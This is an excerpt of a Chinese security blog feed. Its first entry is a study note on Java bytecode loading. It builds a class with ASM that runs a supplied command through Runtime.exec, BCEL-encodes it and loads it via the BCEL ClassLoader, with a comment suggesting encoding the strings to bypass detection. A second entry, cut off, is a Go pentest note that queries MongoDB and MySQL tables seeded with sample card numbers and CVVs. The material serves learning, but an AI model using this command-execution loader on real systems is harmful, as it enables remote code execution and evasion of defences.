href="#ClassVistor" class="headerlink" title="ClassVistor"></a>ClassVistor</h3><p>ClassVistor用于访问class，本身是抽象类。<strong>定义在读取Class字节码时会触发的事件。</strong>只要将所需执行的操作写入对应方法下，调用ClassVistor的其他类就能在对应的条件下触发他们。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">ClassVisitor</span><span class="params">(<span class="type">int</span> api, ClassVisitor cv)</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">visit</span><span class="params">(<span class="type">int</span> version, <span class="type">int</span> access, String name, String signature, String superName, String[] interfaces)</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">visitSource</span><span class="params">(String source, String debug)</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">visitOuterClass</span><span class="params">(String owner, String name, String desc)</span>; </span><br><span class="line">AnnotationVisitor <span class="title function_">visitAnnotation</span><span class="params">(String desc, <span class="type">boolean</span> visible)</span>; </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">visitAttribute</span><span class="params">(Attribute attr)</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">visitInnerClass</span><span class="params">(String name, String outerName, String innerName, <span class="type">int</span> access)</span>;</span><br><span class="line"><span class="keyword">public</span> FieldVisitor <span class="title function_">visitField</span><span class="params">(<span class="type">int</span> access, String name, String desc, String signature, Object value)</span>;</span><br><span class="line"><span class="keyword">public</span> MethodVisitor <span class="title function_">visitMethod</span><span class="params">(<span class="type">int</span> access, String name,String desc,String signature, String[] exceptions)</span>;</span><br><span class="line"><span class="keyword">void</span> <span class="title function_">visitEnd</span><span class="params">()</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>简要说明一下下文用到的方法参数</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">visit</span><span class="params">(<span class="type">int</span> version, <span class="type">int</span> access, String name, String signature, String superName, String[] interfaces)</span>;</span><br></pre></td></tr></table></figure><ul><li><p>version为编辑的类的java版本，例如V1_8;</p></li><li><p>access为访问标识，即该类的修饰，如ACC_PUBLIC. 若一个类具有多个修饰符，将Opcode码相加即可;</p></li><li><p>name为类的内部名；</p></li><li><p>signature为签名，可为null；</p></li><li><p>superName描述它的超类，即extends的类，填写内部名；</p></li><li><p>superName描述它的接口，即implements的类，填写内部名；</p></li></ul><p>注：<strong>ClassWriter继承了ClassVisitor</strong>。</p><p>其中，还是用的到了如下函数</p><p>methodVisitor .visitXXXInsn()来填充函数，添加方法实现的字节码</p><ul><li>visitVarInsn(int opcode, int var) ：带有参数的字节码指令</li><li>visitInsn(int opcode) ： 无参数的字节码指令</li><li>visitLdcInsn(Object cst): LDC专用指令。LDC_W，LDC2_W已被废弃</li><li>visitTypeInsn(int opcode, String type) ：带有引用类型参数的字节码指令</li><li>visitMethodInsn(int opcode, String owner, String name,String desc)：调用方法</li><li>visitFieldInsn(int opcode, String owner, String name, String desc)：操作变量</li></ul><p>字节码指令如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span>: iload_1</span><br><span class="line"><span class="number">1</span>: iflt          <span class="number">12</span>     ###如果栈顶值&lt;=<span class="number">0</span>，则跳转至label标记指定的指令，否则顺序执行</span><br><span class="line"><span class="number">4</span>: aload_0</span><br><span class="line"><span class="number">5</span>: iload_1</span><br><span class="line"><span class="number">6</span>: putfield      #<span class="number">2</span>     <span class="comment">// Field f:I</span></span><br><span class="line"><span class="number">9</span>: goto          <span class="number">20</span>     ####无条件跳转</span><br><span class="line">###创建一个异常对象，并压入栈顶。</span><br><span class="line"><span class="number">12</span>: <span class="keyword">new</span>          #<span class="number">3</span>     <span class="comment">// class java/lang/IllegalArgumentException</span></span><br><span class="line"><span class="number">15</span>: dup                 ####栈顶值再入栈一次，此时栈顶前<span class="number">2</span>位都是同一个值</span><br><span class="line">###invokespecial 弹出栈顶元素，调用其构造函数，此时栈顶值仍然是异常对象</span><br><span class="line"><span class="number">16</span>: invokespecial #<span class="number">4</span>    <span class="comment">// Method java/lang/IllegalArgumentException.&quot;&lt;init&gt;&quot;:()V  </span></span><br><span class="line"><span class="number">19</span>: athrow    ###弹出剩下的异常的副本，</span><br><span class="line"><span class="number">20</span>: <span class="keyword">return</span></span><br></pre></td></tr></table></figure><p>最后我们的demo可以为</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ASM;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> jdk.internal.org.objectweb.asm.Opcodes.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ASM_Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException, IllegalAccessException, InvocationTargetException, InstantiationException, NoSuchMethodException, IOException &#123;</span><br><span class="line">        <span class="comment">// 注意导入开头为jdk.internal</span></span><br><span class="line">        <span class="comment">// 注意flag为COMPUTE_FRAMES否则报错</span></span><br><span class="line">        jdk.internal.org.objectweb.asm.<span class="type">ClassWriter</span> <span class="variable">classWriter</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">jdk</span>.internal.org.objectweb.asm.ClassWriter(</span><br><span class="line">                jdk.internal.org.objectweb.asm.ClassWriter.COMPUTE_FRAMES);</span><br><span class="line">        <span class="comment">// 类属性visitor</span></span><br><span class="line">        jdk.internal.org.objectweb.asm.FieldVisitor fieldVisitor;</span><br><span class="line">        <span class="comment">// 类方法visitor</span></span><br><span class="line">        jdk.internal.org.objectweb.asm.MethodVisitor methodVisitor;</span><br><span class="line">        <span class="comment">// 类名可以自行修改</span></span><br><span class="line">        classWriter.visit(V1_8, ACC_PUBLIC | ACC_SUPER, <span class="string">&quot;com/ByteCodeEvil&quot;</span>, <span class="literal">null</span>, <span class="string">&quot;java/lang/Object&quot;</span>, <span class="literal">null</span>);</span><br><span class="line">        fieldVisitor = classWriter.visitField(<span class="number">0</span>, <span class="string">&quot;res&quot;</span>, <span class="string">&quot;Ljava/lang/String;&quot;</span>, <span class="literal">null</span>, <span class="literal">null</span>);</span><br><span class="line">        fieldVisitor.visitEnd();</span><br><span class="line">        methodVisitor = classWriter.visitMethod(ACC_PUBLIC, <span class="string">&quot;&lt;init&gt;&quot;</span>, <span class="string">&quot;(Ljava/lang/String;)V&quot;</span>, <span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;java/io/IOException&quot;</span>&#125;);</span><br><span class="line">        methodVisitor.visitCode();</span><br><span class="line">        methodVisitor.visitVarInsn(ALOAD, <span class="number">0</span>);</span><br><span class="line">        methodVisitor.visitMethodInsn(INVOKESPECIAL, <span class="string">&quot;java/lang/Object&quot;</span>, <span class="string">&quot;&lt;init&gt;&quot;</span>, <span class="string">&quot;()V&quot;</span>, <span class="literal">false</span>);</span><br><span class="line">        methodVisitor.visitTypeInsn(NEW, <span class="string">&quot;java/lang/StringBuilder&quot;</span>);</span><br><span class="line">        methodVisitor.visitInsn(DUP);</span><br><span class="line">        methodVisitor.visitMethodInsn(INVOKESPECIAL, <span class="string">&quot;java/lang/StringBuilder&quot;</span>, <span class="string">&quot;&lt;init&gt;&quot;</span>, <span class="string">&quot;()V&quot;</span>, <span class="literal">false</span>);</span><br><span class="line">        methodVisitor.visitVarInsn(ASTORE, <span class="number">2</span>);</span><br><span class="line">        methodVisitor.visitTypeInsn(NEW, <span class="string">&quot;java/io/BufferedReader&quot;</span>);</span><br><span class="line">        methodVisitor.visitInsn(DUP);</span><br><span class="line">        methodVisitor.visitTypeInsn(NEW, <span class="string">&quot;java/io/InputStreamReader&quot;</span>);</span><br><span class="line">        methodVisitor.visitInsn(DUP);</span><br><span class="line">        <span class="comment">// 这里可以针对字符串做拆分编码等操作来Bypass</span></span><br><span class="line">        methodVisitor.visitMethodInsn(INVOKESTATIC, <span class="string">&quot;java/lang/Runtime&quot;</span>, <span class="string">&quot;getRuntime&quot;</span>, <span class="string">&quot;()Ljava/lang/Runtime;&quot;</span>, <span class="literal">false</span>);</span><br><span class="line">        methodVisitor.visitVarInsn(ALOAD, <span class="number">1</span>);</span><br><span class="line">        methodVisitor.visitMethodInsn(INVOKEVIRTUAL, <span class="string">&quot;java/lang/Runtime&quot;</span>, <span class="string">&quot;exec&quot;</span>, <span class="string">&quot;(Ljava/lang/String;)Ljava/lang/Process;&quot;</span>, <span class="literal">false</span>);</span><br><span class="line">        methodVisitor.visitMethodInsn(INVOKEVIRTUAL, <span class="string">&quot;java/lang/Process&quot;</span>, <span class="string">&quot;getInputStream&quot;</span>, <span class="string">&quot;()Ljava/io/InputStream;&quot;</span>, <span class="literal">false</span>);</span><br><span class="line">        methodVisitor.visitMethodInsn(INVOKESPECIAL, <span class="string">&quot;java/io/InputStreamReader&quot;</span>, <span class="string">&quot;&lt;init&gt;&quot;</span>, <span class="string">&quot;(Ljava/io/InputStream;)V&quot;</span>, <span class="literal">false</span>);</span><br><span class="line">        methodVisitor.visitMethodInsn(INVOKESPECIAL, <span class="string">&quot;java/io/BufferedReader&quot;</span>, <span class="string">&quot;&lt;init&gt;&quot;</span>, <span class="string">&quot;(Ljava/io/Reader;)V&quot;</span>, <span class="literal">false</span>);</span><br><span class="line">        methodVisitor.visitVarInsn(ASTORE, <span class="number">3</span>);</span><br><span class="line">        jdk.internal.org.objectweb.asm.<span class="type">Label</span> <span class="variable">label0</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">jdk</span>.internal.org.objectweb.asm.Label();</span><br><span class="line">        methodVisitor.visitLabel(label0);</span><br><span class="line">        methodVisitor.visitVarInsn(ALOAD, <span class="number">3</span>);</span><br><span class="line">        methodVisitor.visitMethodInsn(INVOKEVIRTUAL, <span class="string">&quot;java/io/BufferedReader&quot;</span>, <span class="string">&quot;readLine&quot;</span>, <span class="string">&quot;()Ljava/lang/String;&quot;</span>, <span class="literal">false</span>);</span><br><span class="line">        methodVisitor.visitInsn(DUP);</span><br><span class="line">        methodVisitor.visitVarInsn(ASTORE, <span class="number">4</span>);</span><br><span class="line">        jdk.internal.org.objectweb.asm.<span class="type">Label</span> <span class="variable">label1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">jdk</span>.internal.org.objectweb.asm.Label();</span><br><span class="line">        methodVisitor.visitJumpInsn(IFNULL, label1);</span><br><span class="line">        methodVisitor.visitVarInsn(ALOAD, <span class="number">2</span>);</span><br><span class="line">        methodVisitor.visitVarInsn(ALOAD, <span class="number">4</span>);</span><br><span class="line">        methodVisitor.visitMethodInsn(INVOKEVIRTUAL, <span class="string">&quot;java/lang/StringBuilder&quot;</span>, <span class="string">&quot;append&quot;</span>, <span class="string">&quot;(Ljava/lang/String;)Ljava/lang/StringBuilder;&quot;</span>, <span class="literal">false</span>);</span><br><span class="line">        methodVisitor.visitLdcInsn(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">        methodVisitor.visitMethodInsn(INVOKEVIRTUAL, <span class="string">&quot;java/lang/StringBuilder&quot;</span>, <span class="string">&quot;append&quot;</span>, <span class="string">&quot;(Ljava/lang/String;)Ljava/lang/StringBuilder;&quot;</span>, <span class="literal">false</span>);</span><br><span class="line">        methodVisitor.visitInsn(POP);</span><br><span class="line">        methodVisitor.visitJumpInsn(GOTO, label0);</span><br><span class="line">        methodVisitor.visitLabel(label1);</span><br><span class="line">        methodVisitor.visitVarInsn(ALOAD, <span class="number">0</span>);</span><br><span class="line">        methodVisitor.visitVarInsn(ALOAD, <span class="number">2</span>);</span><br><span class="line">        methodVisitor.visitMethodInsn(INVOKEVIRTUAL, <span class="string">&quot;java/lang/StringBuilder&quot;</span>, <span class="string">&quot;toString&quot;</span>, <span class="string">&quot;()Ljava/lang/String;&quot;</span>, <span class="literal">false</span>);</span><br><span class="line">        methodVisitor.visitFieldInsn(PUTFIELD, <span class="string">&quot;com/ByteCodeEvil&quot;</span>, <span class="string">&quot;res&quot;</span>, <span class="string">&quot;Ljava/lang/String;&quot;</span>);</span><br><span class="line">        methodVisitor.visitInsn(RETURN);</span><br><span class="line">        methodVisitor.visitMaxs(<span class="number">6</span>, <span class="number">5</span>);</span><br><span class="line">        methodVisitor.visitEnd();</span><br><span class="line">        methodVisitor = classWriter.visitMethod(ACC_PUBLIC, <span class="string">&quot;toString&quot;</span>, <span class="string">&quot;()Ljava/lang/String;&quot;</span>, <span class="literal">null</span>, <span class="literal">null</span>);</span><br><span class="line">        methodVisitor.visitCode();</span><br><span class="line">        methodVisitor.visitVarInsn(ALOAD, <span class="number">0</span>);</span><br><span class="line">        methodVisitor.visitFieldInsn(GETFIELD, <span class="string">&quot;com/ByteCodeEvil&quot;</span>, <span class="string">&quot;res&quot;</span>, <span class="string">&quot;Ljava/lang/String;&quot;</span>);</span><br><span class="line">        methodVisitor.visitInsn(ARETURN);</span><br><span class="line">        methodVisitor.visitMaxs(<span class="number">1</span>, <span class="number">1</span>);</span><br><span class="line">        methodVisitor.visitEnd();</span><br><span class="line">        classWriter.visitEnd();</span><br><span class="line">        <span class="type">byte</span>[] code = classWriter.toByteArray();</span><br><span class="line">        <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> <span class="string">&quot;calc.exe&quot;</span>;</span><br><span class="line">        <span class="comment">// 对bytes类型字节码进行BCEL转换</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">byteCode</span> <span class="operator">=</span> com.sun.org.apache.bcel.internal.classfile.Utility.encode(code, <span class="literal">true</span>);</span><br><span class="line">        byteCode = <span class="string">&quot;$$BCEL$$&quot;</span> + byteCode;</span><br><span class="line">        <span class="comment">// 使用BCELClassLoader加载构造的字节码</span></span><br><span class="line">        Class&lt;?&gt; c = Class.forName(<span class="string">&quot;com.sun.org.apache.bcel.internal.util.ClassLoader&quot;</span>);</span><br><span class="line">        <span class="type">ClassLoader</span> <span class="variable">loader</span> <span class="operator">=</span> (ClassLoader) c.newInstance();</span><br><span class="line">        Class&lt;?&gt; clazz = loader.loadClass(byteCode);</span><br><span class="line">        java.lang.reflect.Constructor&lt;?&gt; constructor = clazz.getConstructor(String.class);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> constructor.newInstance(cmd);</span><br><span class="line">        System.out.println(obj.toString());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="0x08-参考"><a href="#0x08-参考" class="headerlink" title="0x08 参考"></a>0x08 参考</h2><p><a href="https://blog.csdn.net/it_freshman/article/details/81156106">https://blog.csdn.net/it_freshman/article/details/81156106</a></p><p><a href="https://tech.meituan.com/2019/09/05/java-bytecode-enhancement.html">https://tech.meituan.com/2019/09/05/java-bytecode-enhancement.html</a></p><p><a href="https://xz.aliyun.com/t/10535#toc-0">https://xz.aliyun.com/t/10535#toc-0</a></p><p><a href="https://www.geekby.site/2021/08/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-4/#1-java-%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%AD%97%E8%8A%82%E7%A0%81">https://www.geekby.site/2021/08/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-4/#1-java-%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%AD%97%E8%8A%82%E7%A0%81</a></p>]]></content>
    
    
    <summary type="html">对java加载字节码的一个学习</summary>
    
    
    
    <category term="java安全" scheme="https://h0ld1rs.github.io/categories/java%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="java安全" scheme="https://h0ld1rs.github.io/tags/java%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>Go渗透测试笔记(七)</title>
    <link href="https://h0ld1rs.github.io/posts/166.html"/>
    <id>https://h0ld1rs.github.io/posts/166.html</id>
    <published>2022-03-05T12:31:26.000Z</published>
    <updated>2022-03-23T14:25:42.544Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Go渗透测试学习笔记-七-–滥用数据库和文件系统"><a href="#Go渗透测试学习笔记-七-–滥用数据库和文件系统" class="headerlink" title="Go渗透测试学习笔记(七)–滥用数据库和文件系统"></a>Go渗透测试学习笔记(七)–滥用数据库和文件系统</h1><h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>在本节，我们学习如何安装和配置各种<code>SQL</code>和<code>NOSQL</code>数据库，并学习如何通过<code>Go</code>来进行交互。</p><h2 id="0x01-与Mongo交互"><a href="#0x01-与Mongo交互" class="headerlink" title="0x01 与Mongo交互"></a>0x01 与Mongo交互</h2><h3 id="1-安装MongoDB数据库然后写入数据"><a href="#1-安装MongoDB数据库然后写入数据" class="headerlink" title="1. 安装MongoDB数据库然后写入数据"></a>1. 安装<code>MongoDB</code>数据库然后写入数据</h3><p>MongoDB是<code>NOSQL</code>数据库，这意味着，他与其他传统数据库不同，他是无架构的。</p><p>使用docker开启了之后，使用<code>store</code>数据库</p><blockquote><p>db.use strore</p></blockquote><p>然后写入数据</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">db.transactions.insert([</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="string">&quot;ccnum&quot;</span>: <span class="string">&quot;4444333322221111&quot;</span>,</span><br><span class="line">    <span class="string">&quot;date&quot;</span>: <span class="string">&quot;2019-01-05&quot;</span>,</span><br><span class="line">    <span class="string">&quot;amount&quot;</span>: <span class="number">100.12</span>,</span><br><span class="line">    <span class="string">&quot;cvv&quot;</span>: <span class="string">&quot;1234&quot;</span>,</span><br><span class="line">    <span class="string">&quot;exp&quot;</span>: <span class="string">&quot;09/2020&quot;</span></span><br><span class="line">  &#125;,</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="string">&quot;ccnum&quot;</span>: <span class="string">&quot;4444123456789012&quot;</span>,</span><br><span class="line">    <span class="string">&quot;date&quot;</span>: <span class="string">&quot;2019-01-07&quot;</span>,</span><br><span class="line">    <span class="string">&quot;amount&quot;</span>: <span class="number">2400.18</span>,</span><br><span class="line">    <span class="string">&quot;cvv&quot;</span>: <span class="string">&quot;5544&quot;</span>,</span><br><span class="line">    <span class="string">&quot;exp&quot;</span>: <span class="string">&quot;02/2021&quot;</span></span><br><span class="line">  &#125;,</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="string">&quot;ccnum&quot;</span>: <span class="string">&quot;4465122334455667&quot;</span>,</span><br><span class="line">    <span class="string">&quot;date&quot;</span>: <span class="string">&quot;2019-01-29&quot;</span>,</span><br><span class="line">    <span class="string">&quot;amount&quot;</span>: <span class="number">1450.87</span>,</span><br><span class="line">    <span class="string">&quot;cvv&quot;</span>: <span class="string">&quot;9876&quot;</span>,</span><br><span class="line">    <span class="string">&quot;exp&quot;</span>: <span class="string">&quot;06/2020&quot;</span></span><br><span class="line">  &#125;</span><br><span class="line">]);</span><br></pre></td></tr></table></figure><h3 id="2-下载包并写入代码"><a href="#2-下载包并写入代码" class="headerlink" title="2. 下载包并写入代码"></a>2. 下载包并写入代码</h3><p>需要先下载包，因为官方没有与<code>NoSQL</code>直接交互的包，</p><p>所以我们安装如下mongo的驱动：<code>go get gopkg.in/mgo.v2</code></p><p>然后写入以下代码</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;fmt&quot;</span></span><br><span class="line"><span class="string">&quot;log&quot;</span></span><br><span class="line"></span><br><span class="line">mgo <span class="string">&quot;gopkg.in/mgo.v2&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> Transaction <span class="keyword">struct</span> &#123;</span><br><span class="line">CCNum      <span class="type">string</span>  <span class="string">`bson:&quot;ccnum&quot;`</span></span><br><span class="line">Date       <span class="type">string</span>  <span class="string">`bson:&quot;date&quot;`</span></span><br><span class="line">Amount     <span class="type">float32</span> <span class="string">`bson:&quot;amount&quot;`</span></span><br><span class="line">Cvv        <span class="type">string</span>  <span class="string">`bson:&quot;cvv&quot;`</span></span><br><span class="line">Expiration <span class="type">string</span>  <span class="string">`bson:&quot;exp&quot;`</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">session, err := mgo.Dial(<span class="string">&quot;192.168.68.137&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">log.Panicln(err)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">defer</span> session.Close()</span><br><span class="line"></span><br><span class="line">results := <span class="built_in">make</span>([]Transaction, <span class="number">0</span>)</span><br><span class="line"><span class="keyword">if</span> err := session.DB(<span class="string">&quot;store&quot;</span>).C(<span class="string">&quot;transactions&quot;</span>).Find(<span class="literal">nil</span>).All(&amp;results); err != <span class="literal">nil</span> &#123;</span><br><span class="line">log.Panicln(err)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> _, txn := <span class="keyword">range</span> results &#123;</span><br><span class="line">fmt.Println(txn.CCNum, txn.Date, txn.Amount, txn.Cvv, txn.Expiration)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20220307112853.png"></p><h2 id="0x02与mysq交互"><a href="#0x02与mysq交互" class="headerlink" title="0x02与mysq交互"></a>0x02与mysq交互</h2><h3 id="1-创建mysql-数据库，并且写入数据"><a href="#1-创建mysql-数据库，并且写入数据" class="headerlink" title="1.创建mysql 数据库，并且写入数据"></a>1.创建mysql 数据库，并且写入数据</h3> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; create database store;</span><br><span class="line">mysql&gt; create table  transactions(</span><br><span class="line">    -&gt; ccnum varchar(32),</span><br><span class="line">    -&gt; date date,</span><br><span class="line">    -&gt; amount decimal(7,2),</span><br><span class="line">    -&gt; cvv char(4),</span><br><span class="line">    -&gt; exp date);</span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> transactions(ccnum, <span class="type">date</span>, amount, cvv, exp) <span class="keyword">values</span> (<span class="string">&#x27;4444333322221111&#x27;</span>, <span class="string">&#x27;2019-01-05&#x27;</span>, <span class="number">100.12</span>, <span class="string">&#x27;1234&#x27;</span>, <span class="string">&#x27;2020-09-01&#x27;</span>);</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> transactions(ccnum, <span class="type">date</span>, amount, cvv, exp) <span class="keyword">values</span> (<span class="string">&#x27;4444123456789012&#x27;</span>, <span class="string">&#x27;2019-01-07&#x27;</span>, <span class="number">2400.18</span>, <span class="string">&#x27;5544&#x27;</span>, <span class="string">&#x27;2021-02-01&#x27;</span>);</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> transactions(ccnum, <span class="type">date</span>, amount, cvv, exp) <span class="keyword">values</span> (<span class="string">&#x27;4465122334455667&#x27;</span>, <span class="string">&#x27;2019-01-29&#x27;</span>, <span class="number">1450.87</span>, <span class="string">&#x27;9876&#x27;</span>, <span class="string">&#x27;2020-06-01&#x27;</span>);</span><br></pre></td></tr></table></figure><h3 id="2-编写代码"><a href="#2-编写代码" class="headerlink" title="2. 编写代码"></a>2. 编写代码</h3><p><code>Go</code>包包含了一个<code>database/sql</code>的标准包</p><p><code>go get github.com/go-sql-driver/mysql</code></p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;database/sql&quot;</span></span><br><span class="line"><span class="string">&quot;fmt&quot;</span></span><br><span class="line"><span class="string">&quot;log&quot;</span></span><br><span class="line"></span><br><span class="line">_ <span class="string">&quot;github.com/go-sql-driver/mysql&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">db,err := sql.Open(<span class="string">&quot;mysql&quot;</span>,<span 